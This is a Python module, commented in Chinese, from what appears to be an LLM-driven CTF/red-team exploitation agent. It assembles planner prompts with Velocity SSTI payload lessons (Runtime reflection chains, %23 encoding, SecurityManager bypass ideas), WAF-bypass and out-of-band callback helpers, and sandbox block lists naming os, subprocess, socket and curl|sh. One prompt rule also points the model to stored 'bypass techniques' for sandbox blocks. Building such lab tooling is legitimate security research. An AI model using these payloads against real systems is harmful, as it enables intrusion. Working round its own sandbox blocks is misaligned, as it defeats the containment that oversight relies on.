from __future__ import annotations

import ast
import json
import os
import platform
import re
from pathlib import Path
from typing import Any

from core.challenge_adapter import ChallengeAdapter, get_adapter
from core.llm_client import DeepSeekClient, SchemaValidationError
from core.memory_store import LayeredMemory
from core.settings import Settings
from core.template_manager import TemplateManager, TemplateSelectionResult
from memory.exploit_trajectory import ExploitTrajectoryMemory, get_trajectory
from memory.verification_memory import VerificationMemory, get_verification
from memory.exploit_primitives import get_primitive_registry
from memory.primitive_learning import get_learning_engine
from memory.primitive_transition_graph import get_transition_graph
from control.anti_regression import PayloadEvolutionEngine, AntiRegressionController
from control.hypothesis_tracker import build_attempted_strategy


# ═══════════════════════════════════════════════════════════════════
# Memory Budget Controller (Task 4 — Strict Memory Budgeting)
# 对长期记忆实施强制分层配额，防止单次长报错冲垮全局约束。
# 每层独立物理舱壁；超配额内容由 head/tail 正则裁剪。
# ═══════════════════════════════════════════════════════════════════

# ── Task 3: Strict Memory Budgeting — physical hard cap per layer ──
# 每一层在物理字符级别被硬截断，不再只是 "打印预算"；总 payload 死锁在 ~4000 chars。
MEMORY_BUDGET: dict[str, int] = {
    "runtime_constraints": 800,    # L1 Manifest — 必须保持紧凑
    "hard_constraints": 600,       # L2 Hard Constraints & Bans
    "sdk_contract": 500,           # L3 SDK API Contract
    "verified_facts": 800,         # L4 Verified Facts + Memory context
    "trajectory_state": 300,       # L5 Dehydrated trajectory (compact JSON)
    "user_goal": 800,              # L6 Structured Observation — whitelist-filtered, no raw stdout/HTML
}

# 最终 payload 的物理硬上限（所有层拼接后强制执行一次，双保险）
_FINAL_PAYLOAD_HARD_CAP = 5000


def normalize_plan(plan: dict) -> dict:
    """Planner 输出后处理，在写 plan.json 之前强制归一化格式。

    消灭 Validator 前三类重复失败：AST mode / step id 漂移 / command 为空。
    """
    steps = plan.get("steps", [])
    modes_before = [s.get("mode") for s in steps]
    print(f"[normalize] 已调用，steps={len(steps)}, modes before={modes_before}")

    for i, step in enumerate(steps):
        # 强制 step id 归一化，消灭 None / ? / 1 / step-1 混用
        step["id"] = f"step-{i + 1}"
        # type 字段归一化
        if step.get("type") not in ("python", "shell"):
            step["type"] = "python"
        # 强制 LEGACY，AST 模式不经过执行器全路径校验
        step["mode"] = "LEGACY"
        # 删除 sdk_calls / imports — Validator 用 sdk_calls 非空判定 AST mode，
        # 不删除的话 mode=LEGACY 也会被读成 AST（line 770）
        if "sdk_calls" in step:
            del step["sdk_calls"]
        if "imports" in step:
            del step["imports"]
        # ── P0: code 字段优先于 command，同步后占位符永不覆盖真实代码 ──
        code_val = step.get("code")
        cmd_val = step.get("command")
        has_code = isinstance(code_val, str) and code_val.strip()
        has_cmd = isinstance(cmd_val, str) and cmd_val.strip()

        if has_code and not has_cmd:
            # code 有内容但 command 为空 → 同步 code → command（Executor 优先读 command）
            step["command"] = code_val
        elif not has_code and not has_cmd:
            # 两者都为空 → 才允许填占位符
            step["command"] = "# EMPTY_STEP: no exploit code was provided for this step"
        # else: both present → keep both as-is, Executor reads command first

        # ── P0: Auto-Patch STEP_OK — 确保 python 步骤末尾有 STEP_OK 标记 ──
        if step.get("type") == "python":
            # Prefer code field if it has content, otherwise patch command
            code_key = "code" if (isinstance(step.get("code"), str) and step.get("code").strip()) else "command"
            code = step.get(code_key, "")
            if isinstance(code, str) and "STEP_OK" not in code:
                step[code_key] = code.rstrip() + "\nprint('STEP_OK')"

    # primitive_context.target_primitive 为空时注入默认值
    pc = plan.get("primitive_context", {})
    if not isinstance(pc, dict):
        pc = {}
    if not pc.get("target_primitive"):
        pc["target_primitive"] = "information_disclosure"
        plan["primitive_context"] = pc

    modes_after = [s.get("mode") for s in plan.get("steps", [])]
    print(f"[normalize] modes after={modes_after}")
    return plan


def _physical_truncate(content: str, limit: int) -> str:
    """Hard character-level truncation — no head/tail, straight slice.

    Keeps the beginning of the content up to *limit* characters,
    appending a compact truncation marker.
    """
    if len(content) <= limit:
        return content
    # Keep first (limit - 50) chars to make room for the marker
    keep = limit - 50
    if keep <= 0:
        keep = limit // 2
    return content[:keep] + f"\n...[TRUNCATED {len(content)}→{limit} chars]..."


def _apply_memory_budget(section_id: str, content: str) -> str:
    """Physically enforce the per-layer character budget defined by MEMORY_BUDGET.

    Uses hard slicing (not head/tail) to guarantee deterministic character limits.
    If *section_id* is not registered, passes through unchanged (caller must handle).
    """
    limit = MEMORY_BUDGET.get(section_id)
    if limit is None:
        return content
    return _physical_truncate(content, limit)


# ═══════════════════════════════════════════════════════════════════
# Task 5 — Attention-Prioritized Prompt Assembly (6 layers)
# ═══════════════════════════════════════════════════════════════════

# ── Task 3 (Cognitive Architecture): HIGH_PRIORITY_LESSONS frontloading ──
# Extracts hard-won lessons from failure history and verification memory,
# prepended to Planner's system prompt with "建议" (guidance) framing rather
# than "禁令" (hard constraint) framing, to avoid locking out exploration.

_VELOCITY_KNOWN_LESSONS: dict[str, str] = {
    "single_quote": (
        "Velocity 模板引擎在解析 #set/#macro/#evaluate 指令时，"
        "单引号包裹的字符串字面量（如 '$x.class'）可能导致解析器失效。"
        "强烈建议优先使用双引号（\"$x.class\"）、无引号语法（$x.class）或 URL 编码的引号（%22）。"
        "示例：#set($rt=$x.class.forName(\"java.lang.Runtime\")) — 使用双引号包裹类名字符串。"
    ),
    "velocity_reflection_block": (
        "Velocity 的 UberspectImpl / SecureUberspector 默认限制了对 java.lang.Class 和 "
        "java.lang.reflect 包的方法调用。即使 $class 被解析，.forName()/.getMethod()/.invoke() "
        "链式调用也可能被 SecurityManager 静默拦截（无异常输出）。"
        "建议优先尝试 #evaluate() 指令、#macro 递归滥用、ResourceLoader 等非反射攻击面。"
    ),
    "url_encoding_hash": (
        "在 GET 参数中传递 Velocity 指令时，# 字符必须进行 URL 编码为 %23。"
        "例如：?text=%23set($x%3D7*7)$x 而非 ?text=#set($x=7*7)$x。"
        "否则 HTTP 框架会将 # 之后的内容视为 URL fragment，导致指令不完整。"
    ),
    "in_band_mandatory": (
        "当前运行环境不支持 OOBReceiver（Windows Docker named pipe 限制）。"
        "所有数据提取必须通过 HTTP 响应体 in-band 回显。"
        "禁止使用 curl/wget OOB 外传；改为在模板中直接输出文件内容到响应体。"
    ),
}


def _build_high_priority_lessons(
    feedback: dict[str, Any] | None,
    verif: Any = None,
    distiller_fingerprints: list[str] | None = None,
) -> str:
    """Extract high-priority lessons from failure history and verification memory.

    Framed as 'HIGH_PRIORITY_LESSONS (高优建议)' — NOT hard constraints.
    This preserves exploration space while nudging Planner away from known dead ends.
    """
    parts: list[str] = []

    # ── 1. Failure fingerprint patterns (from distiller, across all rounds) ──
    if distiller_fingerprints:
        fp_lessons: dict[str, str] = {
            "ssti_surface_blocked": (
                "SSTI 表面已被封锁：payload 发送成功但模板引擎未解析指令。"
                "排查顺序：1) #是否做了URL编码(%23) 2) 参数名是否正确 3) GET还是POST"
            ),
            "template_eval_only": (
                "模板引擎确认可解析算术表达式（如 7*7=49），但反射链被阻塞。"
                "建议不要再反复尝试 getClass/forName/Runtime 链，改为尝试 #evaluate() 指令或 #macro 滥用。"
            ),
            "reflection_only": (
                "仅检测到 49 算术求值，无对象访问或方法调用痕迹。"
                "Velocity SecurityManager 可能在静默拦截。建议切换攻击面到 #evaluate 或 ResourceLoader。"
            ),
            "object_access_only": (
                "$class 对象已访问但无法调用 .forName()/.getMethod()。"
                "UberspectImpl 很可能限制了反射方法调用。尝试 Uberspect 绕过或 #macro 递归。"
            ),
            "method_blocked": (
                "方法调用被 SecurityManager 拦截（如 ParseException/NoSuchMethod）。"
                "切换策略：尝试不同的类加载路径，或通过 #evaluate 间接执行。"
            ),
            "syntax_error": (
                "Python 脚本有语法错误。排查：字符串引号配对、缩进、f-string 内引号类型。"
                "Velocity payload 中的双引号需要在 Python 字符串中正确转义。"
            ),
            "field_mismatch": (
                "REST API 字段名不匹配（如 'All fields are required!' 或 'Invalid Email'）。"
                "从证据代码中确认正确的 request.form.get('REAL_NAME') 字段名，而不是盲猜 username/email。"
            ),
        }
        matched_fps = set(distiller_fingerprints)
        for fp, lesson in fp_lessons.items():
            if fp in matched_fps:
                parts.append(f"  • [{fp}]: {lesson}")

    # ── 2. Verification memory: blacklisted payload patterns ──
    if verif is not None:
        try:
            bl = verif.get_fact("payload_blacklist", [])
            if bl:
                parts.append(f"  • 已知被过滤的关键词: {', '.join(bl[:5])}")
            bypasses = verif.get_fact("payload_bypass_techniques", [])
            if bypasses:
                parts.append(f"  • 已知绕过手法: {'; '.join(bypasses[:3])}")
            accepted = verif.get_fact("accepted_fields", [])
            rejected = verif.get_fact("rejected_fields", [])
            if accepted:
                parts.append(f"  • 已确认接受的字段名: {', '.join(accepted)}")
            if rejected:
                parts.append(f"  • 已确认拒绝的字段名 (请避开): {', '.join(rejected)}")
        except Exception:
            pass

    # ── 3. CWE-specific / template-engine-specific known lessons ──
    if verif is not None:
        try:
            engine = verif.get_fact("template_engine", "")
            if "velocity" in str(engine).lower():
                for key, lesson in _VELOCITY_KNOWN_LESSONS.items():
                    parts.append(f"  • [Velocity/{key}]: {lesson}")
        except Exception:
            pass

    # ── 4. Persistent failure fingerprints from feedback ──
    persistent_fps = (feedback or {}).get("_persistent_failure_fingerprints", [])
    if persistent_fps:
        parts.append(f"  • 跨轮持久失败指纹: {', '.join(sorted(persistent_fps)[:5])}")

    # ── 5. Prior evaluator hypothesis (if relevant) ──
    prior_hypothesis = (feedback or {}).get("hypothesis", "")
    if prior_hypothesis and prior_hypothesis != "证据不足，无法推断":
        parts.append(f"  • 前轮假说: {prior_hypothesis[:200]}")

    if not parts:
        return ""

    header = (
        "╔══════════════════════════════════════════════════════════════╗\n"
        "║  📚 HIGH_PRIORITY_LESSONS (高优历史教训 — 强烈建议避坑)    ║\n"
        "╚══════════════════════════════════════════════════════════════╝\n"
        "\n"
        "以下是经过多轮实战验证的关键教训。这些不是绝对禁令（你仍可根据上下文自行判断），\n"
        "但历史数据显示遵循这些建议可大幅减少无意义的重复试错：\n"
    )
    return header + "\n".join(parts) + "\n"

def _build_runtime_manifest_block() -> str:
    """[Layer 1] Runtime Manifest — 显式能力清单（硬编码，零幻觉）。"""
    try:
        from coordinator import RUNTIME_MANIFEST, RUNTIME_CAPABILITY_REGISTRY
        mf = RUNTIME_MANIFEST
        cr = RUNTIME_CAPABILITY_REGISTRY
    except ImportError:
        # Fallback 必须与 coordinator.RUNTIME_MANIFEST 保持 1:1 物理一致
        mf = {
            "sdk_primitives": [
                "HttpClient.get",
                "HttpClient.post",
                "HttpClient.raw_request",
                "HttpClient.last_response",
            ],
            "safe_modules": [
                "json", "base64", "re", "time", "struct",
                "urllib.parse", "http.cookies",
                "hashlib", "hmac",
                "redteam_sdk",
            ],
            "blocked_modules": [
                "os", "subprocess", "socket", "ctypes", "cffi", "pty",
                "signal", "multiprocessing", "importlib", "pickle", "marshal",
                "builtins", "gc", "inspect", "ast", "code", "codeop",
                "compileall", "dis", "types", "weakref",
                "requests", "urllib3", "urllib",
                "uuid", "random", "string",
            ],
            "network_mode": "bridge",
            "target_access_mode": "container_ip_only",
        }
        cr = {
            "oob_receiver": False,
            "docker_available": True,
            "in_band_only": True,
        }
    prims = ", ".join(mf.get("sdk_primitives", []))
    safe = ", ".join(sorted(mf.get("safe_modules", [])))
    blocked = ", ".join(sorted(mf.get("blocked_modules", [])))
    oob_status = "AVAILABLE" if cr.get("oob_receiver") else "DISABLED — DO NOT USE"
    exfil_mode = "in-band HTTP response only" if cr.get("in_band_only") else "OOB available"
    return (
        "RUNTIME MANIFEST (能力注册清单)\n"
        f"  SDK Primitives: {prims}\n"
        f"  Allowed modules: {safe}\n"
        f"  Blocked modules: {blocked}\n"
        f"  Network: {mf.get('network_mode', 'bridge')} | "
        f"Target: {mf.get('target_access_mode', 'container_ip_only')}\n"
        f"  RUNTIME CAPABILITY REGISTRY:\n"
        f"    oob_receiver: {oob_status}\n"
        f"    data_exfil_mode: {exfil_mode}\n"
        f"    docker_available: {'YES' if cr.get('docker_available') else 'NO'}"
    )


def _build_hard_constraints_block() -> str:
    """[Layer 2] Hard Constraints — 绝对禁令（不可违反的物理约束）。"""
    return (
        "HARD CONSTRAINTS (绝对禁令)\n"
        "  ❌ import os, subprocess, socket, pickle, ctypes, requests, urllib3\n"
        "  ❌ os.system() / subprocess.run() / __import__() — 文本也被拦截\n"
        "  ❌ shell 禁止 bash/sh/zsh；❌ curl|sh, wget|sh\n"
        "  ❌ 单行分号串联 (SyntaxError)\n"
        "  ✅ import: json, re, base64, hashlib, hmac, struct, urllib.parse, http.cookies\n"
        "  ✅ HTTP 唯一通道: redteam_sdk.HttpClient\n"
        "  ✅ OOB 唯一通道: redteam_sdk.OOBReceiver"
    )


def _build_sdk_contract_block() -> str:
    """[Layer 3] SDK API Contract — 唯一合法接口契约。"""
    return (
        "SDK API CONTRACT (唯一合法接口)\n"
        "  from redteam_sdk import HttpClient, ContextStore, OOBReceiver\n"
        "  s = HttpClient(target_base)    # 自动 session 持久化\n"
        "  s.get(path) / s.post(path, data=...) / s.put(path, json=...)\n"
        "  s.raw_request('GET', '/path#frag')  # WAF绕过保留特殊字符\n"
        "  oob = OOBReceiver(port=8765); oob.start()\n"
        "  hit = oob.wait_for_callback(timeout=30)\n"
        "  target_base=json.load(open('/workspace/context.json')).get('target_context',{}).get('base_url','')"
    )


# ═══════════════════════════════════════════════════════════════════
# Task 6 — Structured JSON AST extraction
# ═══════════════════════════════════════════════════════════════════

_SDK_CALL_PATTERNS = [
    r"\b(HttpClient\s*\.\s*\w+\s*\()",
    r"\b(OOBReceiver\s*\.\s*\w+\s*\()",
    r"\b(ContextStore\s*\.\s*\w+\s*\()",
    r"\b(save_context\s*\()",
    r"\b(load_context\s*\()",
    r"\b(output_result\s*\()",
]


def _extract_step_ast(step: dict[str, Any]) -> dict[str, Any]:
    """Parse a step's command code and extract structured imports + SDK calls.

    In AST mode (sdk_calls present, no command): uses declared imports/sdk_calls directly.
    In LEGACY mode (command present): ast.parse() + regex extraction.

    Returns the step dict enriched with:
      - _ast_imports: list[str]    — modules imported in this step
      - _ast_sdk_calls: list[str]  — SDK primitives invoked
      - _ast_valid: bool           — True if AST parsing succeeded
    """
    declared_sdk = step.get("sdk_calls")
    is_ast_mode = isinstance(declared_sdk, list) and len(declared_sdk) > 0

    if is_ast_mode:
        # Pure AST mode — use declared arrays directly, no ast.parse() needed
        step["_ast_imports"] = step.get("imports") or []
        step["_ast_sdk_calls"] = declared_sdk
        step["_ast_valid"] = True
        return step

    cmd = step.get("command", "")
    if not isinstance(cmd, str) or not cmd.strip():
        step["_ast_imports"] = []
        step["_ast_sdk_calls"] = []
        step["_ast_valid"] = False
        return step

    imports: list[str] = []
    sdk_calls: list[str] = []

    try:
        tree = ast.parse(cmd)
        step["_ast_valid"] = True
    except SyntaxError:
        step["_ast_imports"] = []
        step["_ast_sdk_calls"] = []
        step["_ast_valid"] = False
        return step

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                imports.append(alias.name)
        elif isinstance(node, ast.ImportFrom):
            module = node.module or ""
            for alias in node.names:
                imports.append(f"{module}.{alias.name}" if module else alias.name)

    # Regex-based SDK call extraction (more robust than AST walking for
    # chained calls like s.get(...) where s is a local variable).
    for pattern in _SDK_CALL_PATTERNS:
        for m in re.finditer(pattern, cmd):
            call = m.group(1)
            if call not in sdk_calls:
                sdk_calls.append(call)

    step["_ast_imports"] = imports
    step["_ast_sdk_calls"] = sdk_calls
    return step


def _extract_plan_ast(plan: dict[str, Any]) -> dict[str, Any]:
    """Post-process a plan: extract AST metadata from every step."""
    steps = plan.get("steps")
    if not isinstance(steps, list):
        return plan
    for st in steps:
        if isinstance(st, dict) and st.get("type") == "python":
            _extract_step_ast(st)
    return plan


def _get_os_context() -> str:
    system = platform.system().lower()
    if system == "windows":
        return """
【重要 - Windows 环境注意事项】
当前运行环境是 Windows 系统！
"""
    else:
        return """
【Linux/macOS 环境】
"""


def _extract_target_tags(confirmed: dict[str, Any]) -> list[str]:
    """从 confirmed_vuln.json 提取当前靶机的技术栈标签用于 ChromaDB 元数据过滤。

    标签来源（按优先级）：
    1. CWE ID 列表
    2. evidence / description 中的关键字词（库名、框架、协议、CVE 编号）
    3. 静态关键词表（基于常见漏洞类型 + 框架名精确匹配）
    4. title / vulnerability 字段

    返回值经过去重、小写、去噪，最多返回 15 个标签。
    """
    vulns = confirmed.get("vulnerabilities", [])
    target_ctx = confirmed.get("target_context", {})
    tags: list[str] = []

    # ── 1. CWE IDs ──
    for v in vulns:
        for key in ("cwe_id", "cwe"):
            cwe = v.get(key, "")
            if isinstance(cwe, str) and cwe.strip() and cwe.strip().upper() != "UNKNOWN":
                tags.append(cwe.strip().lower())

    # ── 2. 拼接所有文本字段做关键词提取 ──
    text_blob_parts: list[str] = []
    for v in vulns:
        for key in ("title", "description", "evidence", "attack_chain", "data_flow",
                     "source", "sink", "location"):
            val = v.get(key, "")
            if isinstance(val, str):
                text_blob_parts.append(val)
            elif isinstance(val, dict):
                text_blob_parts.append(val.get("code_snippet") or "")
    text_blob = " ".join(text_blob_parts)

    # CVE 编号（CVE-YYYY-NNNNN）
    for match in re.finditer(r'CVE-\d{4}-\d{4,}', text_blob, re.IGNORECASE):
        tags.append(match.group(0).lower())

    # 提取关键词：框架 / 库 / 协议 / 技术栈名称
    # 知名安全相关技术栈关键词
    known_keywords = [
        # Web frameworks
        "flask", "django", "fastapi", "express", "spring", "laravel", "rails",
        "asp.net", "aspnet", "node.js", "nodejs", "react", "vue", "angular",
        # Auth / JWT
        "jwt", "oauth", "oauth2", "saml", "openid", "jose", "jwk", "jws", "jwe",
        "python_jwt", "pyjwt", "authlib", "jwcrypto",
        # Proxy / LB
        "haproxy", "nginx", "apache", "traefik", "envoy", "caddy", "iis",
        # Protocols
        "http", "https", "websocket", "grpc", "graphql", "rest", "soap",
        # Serialization
        "pickle", "json", "yaml", "xml", "protobuf", "avro",
        # Databases
        "mysql", "postgresql", "postgres", "sqlite", "mongodb", "redis",
        "mssql", "oracle", "mariadb",
        # Languages
        "python", "java", "php", "ruby", "go", "golang", "javascript", "typescript",
        "c#", "csharp", "perl", "lua",
        # Template engines
        "jinja2", "jinja", "twig", "freemarker", "velocity", "thymeleaf", "mustache",
        "handlebars", "ejs", "pug", "nunjucks", "smarty",
        # Attack types (from CWE)
        "ssti", "sqli", "sql", "xss", "csrf", "ssrf", "rce", "lfi", "rfi",
        "path_traversal", "command_injection", "deserialization", "xxe",
        "idor", "auth_bypass", "algorithm_confusion",
        # Misc security terms
        "rsa", "rs256", "hs256", "ps256", "es256", "ed25519", "ecdsa",
        "sha256", "md5", "aes", "hmac",
        # Tool-specific
        "nuclei", "sqlmap", "burp", "metasploit",
        # Docker / infra
        "docker", "kubernetes", "k8s", "aws", "gcp", "azure",
    ]
    text_lower = text_blob.lower()
    for kw in known_keywords:
        if kw in text_lower:
            tags.append(kw)

    # ── 3. 从 target_context 提取 ──
    app_name = target_ctx.get("app_name", "")
    if isinstance(app_name, str) and app_name.strip():
        for word in app_name.lower().replace("_", " ").replace("-", " ").split():
            w = word.strip()
            if w and len(w) >= 2:
                tags.append(w)

    base_url = target_ctx.get("base_url", "")
    if isinstance(base_url, str):
        if "https" in base_url:
            tags.append("https")

    # ── 4. Evidence 中特定代码模式 ──
    evidence_specific: list[str] = []
    for v in vulns:
        evidence = v.get("evidence", "")
        if isinstance(evidence, dict):
            evidence = evidence.get("code_snippet", "")
        if isinstance(evidence, str):
            evidence_specific.append(evidence)
    evidence_text = " ".join(evidence_specific)
    # 从代码片段中提取 import / require / use 语句中的库名
    for match in re.finditer(r'(?:import|from|require|use)\s+(\w+)', evidence_text):
        lib = match.group(1).lower()
        if lib not in ("os", "sys", "re", "json", "time", "io", "typing"):
            tags.append(lib)

    # ── 5. 去重 + 去噪 ──
    noise = {"", "unknown", "none", "a", "in", "of", "to", "is", "it", "be", "as", "at",
             "by", "an", "or", "on", "no", "so", "do", "if", "we", "he", "me", "my", "up",
             "the", "and", "for", "with", "that", "this", "from", "when", "file", "line",
             "rce", "lfi"}
    seen: set[str] = set()
    deduped: list[str] = []
    for t in tags:
        t = t.strip().lower()
        if t and t not in seen and t not in noise:
            seen.add(t)
            deduped.append(t)

    # Cap at 15 to keep the $or clause reasonable
    return deduped[:15]


_COMMON_RULES = """╔══════════════════════════════════════════════════════════════════╗
║  🔴 任务目标：拿到 FLAG 才算赢。任何其他输出都不算。            ║
╚══════════════════════════════════════════════════════════════════╝
【flag 长这样 — 只有 stdout 中出现以下格式才算任务完成】
    flag{...}    HTB{...}    CTF{...}
  除此之外的一切输出（命令结果、文件内容、HTTP 状态码、STEP_OK……）
  统统是中间过程，不是终点。每轮结束问自己：stdout 里有 flag 格式的字符串吗？
  没有 → 继续。有 → 停。

╔══════════════════════════════════════════════════════════════════╗
║  🔴 redteam_sdk 唯一合法用法（API 幻觉防火墙 — 首先阅读！）    ║
╚══════════════════════════════════════════════════════════════════╝
【保存上下文】save_context('key_name', 'value_string')
   ✅ 必须传入两个参数（key + value），缺一不可！
   ❌ save_context('key') — 缺少 value 参数，会报 TypeError！
   ❌ ContextStore.save(key, val) — 也应该传入两个参数！

【HTTP 请求】client = HttpClient('URL')
   ✅ HttpClient(base_url) — 构造函数仅接受 1 个参数！
   ❌ HttpClient(url, timeout=..., verify=..., headers=...) — 这些全是幻觉 kwargs！
   ❌ headers/cookies 通过 .get()/.post() 的参数传递，而非构造函数！

【读取上下文】json.load(open('/workspace/context.json'))
   ✅ import json; ctx = json.load(open('/workspace/context.json'))
   ✅ ctx.get('target_context', {}).get('base_url', '')
   ❌ ContextStore.get() — ContextStore 没有 .get() 方法！
   ❌ ctx['locked_host'] — 键名幻觉！只能用 .get('target_context', {}) 取！

════════════════════ 沙箱执行约束 ════════════════════════

【🔴 核心行动钢印：运行时反射探测（Reflection）】
当你需要使用本地的自定义模块（如 `redteam_sdk`、`OOBReceiver`）或者调用未知组件，且你在当前长期记忆中找不到其确切的方法名定义时，**你绝对禁止在第一轮迭代中直接编造复杂的利用代码**。
你必须遵守黑客探针前置原则：在 Step 1 编写一个极简的反射探针，利用 `import redteam_sdk; print("[REFLECT_SDK]", dir(redteam_sdk), dir(redteam_sdk.OOBReceiver))` 并在 stdout 中打印。
本框架的沙箱执行器会将沙箱的 stdout 完美喂回给你。在接下来的迭代轮次中，你必须实时审查 feedback 中捕获到的真实成员属性列表，据此编写 100% 精确的利用代码，彻底消除接口幻觉。

【❌ 绝对禁令 — SDK 内部键名与属性焊死约束（违反立即导致 NameError / KeyError）】
  读取上下文 context.json 时，必须使用 `.get('target_context', {})`。严禁盲猜或使用 'locked_host' 键！
  调用 OOB 接收器时，获取回调 URL 的唯一合法属性是 `OOBReceiver.url`，严禁调用不存在的 `get_address()` 方法！
  ContextStore 只有 .save(key, val) 和 .load(key) 两个方法，严禁调用 .get() / .set() / .fetch() 等不存在的方法！

【⛔ 禁止导入的模块 + 禁止的代码模式（导入/执行必被拦截，不要浪费时间！）】
  ❌ import os, subprocess, socket, pickle, ctypes, cffi, importlib, builtins
  ❌ gc, inspect, ast, code, codeop, dis, types, marshal, pty, multiprocessing, signal, weakref
  ❌ __import__('os') / compile() / execfile() — 运行时也会被正则拦截，别试绕过！
  ❌ os.system() / os.popen() / subprocess.run() — 任何形式的命令执行都会被拦截
  ❌ shell 步骤禁止 bash/sh/zsh — 只允许 curl, wget, python3 等白名单工具
  ❌ import requests, urllib3, httpx, http — 原生通信库全部被禁！唯一合法网络通道: redteam_sdk.HttpClient
  ✅ import urllib.parse — URL 编码已放行，SSTI/编码利用必备！禁止 import urllib.request（原生通信）！

【✅ 允许的 Python 模块 — 所有 import 只能从这里面选！】
  json, re, base64, hashlib, hmac, struct, binascii
  bs4(BeautifulSoup), jwt, html, xml, lxml
  Crypto, cryptography
  time, datetime, random, string, itertools, functools, collections, copy, io, pathlib
  threading, redteam_sdk
  typing, dataclasses, enum, abc, codecs, unicodedata, math, decimal, fractions

【✅ shell 白名单工具】curl, wget, python3, py, jq, grep, awk, sed, cut, sort, uniq, tr, head, tail, echo, cat, ls, pwd, dig, nslookup, host, openssl, nmap, sqlmap, nikto, wfuzz, ffuf, gobuster

1. /workspace 只读！数据传递用 save_context/load_context 或写 /tmp/
   ⚠️ step 之间禁止通过 /tmp 文件传递数据，必须在单个 step 的 code 里完成完整的请求链，
   先 GET 获取数据，立即在同一脚本里 POST 使用它，不要拆成两个依赖文件的 step。
2. HTTP 交互用 HttpClient (requests.Session 封装)，反连监听用 OOBReceiver
3. Python 代码必须多行缩进，严禁单行分号串联 (SyntaxError)
4. 🔴 所有 HTTP 请求/关键操作必须包裹在 try/except 中，防止沙箱崩溃：
   try:
       resp = s.get('/', params={'text': '...'})
       print(f'HTTP {resp.status_code}: {resp.text[:500]}')
   except Exception as e: print(f'[ERR] {e}')
5. 禁止 pipe 到 sh/bash，禁止编造 URL 路径，禁止手写正则解析 HTML/JSON/JWT
6. ⚠️ Validator 只检查 import 语句，Executor 会额外对代码文本做正则拦截（os.system/subprocess 字面量也会被拦）"
7. 遇到沙箱拦截 → 查看下方"🛡️ 沙箱冲突规避"记忆区获取正确绕过手法（不从这里找答案）

═══════════════ SDK 速查表 (redteam_sdk) ═══════════════
🔴 唯一合法网络通道！所有 HTTP 操作必须且只能通过 SDK 原语执行。
from redteam_sdk import HttpClient, ContextStore, OOBReceiver, save_context, load_context, output_result

# base_url 从 context.json 动态读取，禁止硬编码域名
import json
with open('/workspace/context.json') as f: ctx = json.load(f)
target_base = ctx.get('target_context', {}).get('base_url', '')
s = HttpClient(target_base)          # 自动恢复/保存 Session Cookie

s.get(path) / s.post(path, data=...) / s.put(path, json=...) / s.delete(path)
s.raw_request('GET', '/path#frag')    # WAF绕过：保留 # %00 ..;/ 等字符
s.auto_extract_csrf()                 # 从 JWT cookie 或 HTML 自动提取 antiCSRFToken

ctx = ContextStore(); ctx.save('k', v); ctx.load('k')   # 跨步骤 KV 存储
save_context('k', v); load_context('k'); output_result(dict)  # 快捷方式

oob = OOBReceiver(port=8765); oob.start()  # Blind RCE 带外反连
hit = oob.wait_for_callback(timeout=30)    # 等待目标回连
oob.stop()

# 数据解析：HTML→BeautifulSoup, JSON→r.json(), JWT→base64+json, 禁止手写正则
# REST 调试：Form=用data=, JSON=用json=; 401→先确认登录成功; 405→换Method
# Shell 步骤: curl|jq ✅  curl|sh ❌; sqlmap -u "URL" --batch --level=2

═══════════ 🔴 API 幻觉防火墙（绝对禁止编造以下方法/参数）═══════════
【HttpClient 唯一合法签名】
  ✅ HttpClient(base_url)              — 构造函数仅接受 1 个参数，禁止传入任何 kwargs！
     ❌ HttpClient(url, timeout=...)    — timeout/verify/proxies/headers 等都是幻觉参数
     ❌ HttpClient(base_url, headers=...) — headers 通过 .get()/.post() 参数传递，非构造函数
  ✅ s.get(path, params={...}, headers={...})
  ✅ s.post(path, data={...}, json={...}, headers={...})
  ✅ s.put(path, json={...}, headers={...})
  ❌ s.get(url, timeout=...)           — timeout/verify/allow_redirects 等不存在

【ContextStore 唯一合法方法 — 只有 2 个！】
  ✅ ctx.save(key: str, value: any)    — 存储键值对
  ✅ ctx.load(key: str) -> any         — 读取键值对
  ❌ ctx.get() / ctx.set() / ctx.fetch() / ctx.read() / ctx.write() — 全部是幻觉！
  ✅ save_context('k', v) / load_context('k') — 快捷函数，同样只有这 2 个

【OOBReceiver 唯一合法属性和方法】
  ✅ oob = OOBReceiver(port=8765)      — 构造时可指定端口
  ✅ oob.url                           — 属性（非方法！），获取回调 URL
  ✅ oob.start()                       — 启动监听
  ✅ hit = oob.wait_for_callback(timeout=30)  — 阻塞等待回调
  ✅ oob.stop()                        — 停止监听
  ❌ oob.get_address() / oob.get_url() / oob.address — 全部是幻觉！只用 .url

【读取上下文 — 唯一合法方式】
  ✅ import json; ctx = json.load(open('/workspace/context.json'))
  ✅ ctx.get('target_context', {}).get('base_url', '')
  ❌ ContextStore.get()                — ContextStore 根本没有 .get() 方法
  ❌ ctx['locked_host']                — 键名幻觉！盲猜 locked_host/remote_host 等必定 KeyError
══════════════════════════════════════════════════════════════════════
"""


def _discover_blueprint_prefixes(confirmed: dict[str, Any]) -> dict[str, str]:
    vulns = confirmed.get("vulnerabilities", [])
    if not vulns:
        return {}

    prefixes: dict[str, str] = {}

    bp_pattern = re.compile(r"""register_blueprint\((\w+)\s*,\s*url_prefix\s*=\s*['\"](/[^'\"]*)['\"]""")
    route_raw_pattern = re.compile(r"""@(\w+)\.route\(['\"](/[^'\"]*)['\"]""")

    for vuln in vulns:
        evidence = vuln.get("evidence", "")
        if isinstance(evidence, dict):
            code = evidence.get("code_snippet", "")
        else:
            code = str(evidence)

        for match in bp_pattern.finditer(code):
            bp_name = match.group(1)
            prefix = match.group(2)
            if bp_name not in prefixes:
                prefixes[bp_name] = prefix

        description = str(vuln.get("description", "")) + str(vuln.get("attack_chain", ""))
        for match in bp_pattern.finditer(description):
            bp_name = match.group(1)
            prefix = match.group(2)
            if bp_name not in prefixes:
                prefixes[bp_name] = prefix

    if not prefixes:
        for vuln in vulns:
            evidence = vuln.get("evidence", "")
            if isinstance(evidence, dict):
                code = evidence.get("code_snippet", "")
            else:
                code = str(evidence)
            description = str(vuln.get("description", "")) + str(vuln.get("attack_chain", ""))
            all_text = f"{code} {description}"

            for match in route_raw_pattern.finditer(all_text):
                bp_name = match.group(1)
                if bp_name in ("web", "api"):
                    if bp_name not in prefixes:
                        if bp_name == "web":
                            prefixes[bp_name] = "/challenge"
                        elif bp_name == "api":
                            prefixes[bp_name] = "/challenge/api"

    return prefixes


def _extract_endpoints_from_vulns(vulns: list[dict[str, Any]], prefixes: dict[str, str]) -> list[str]:
    seen = set()
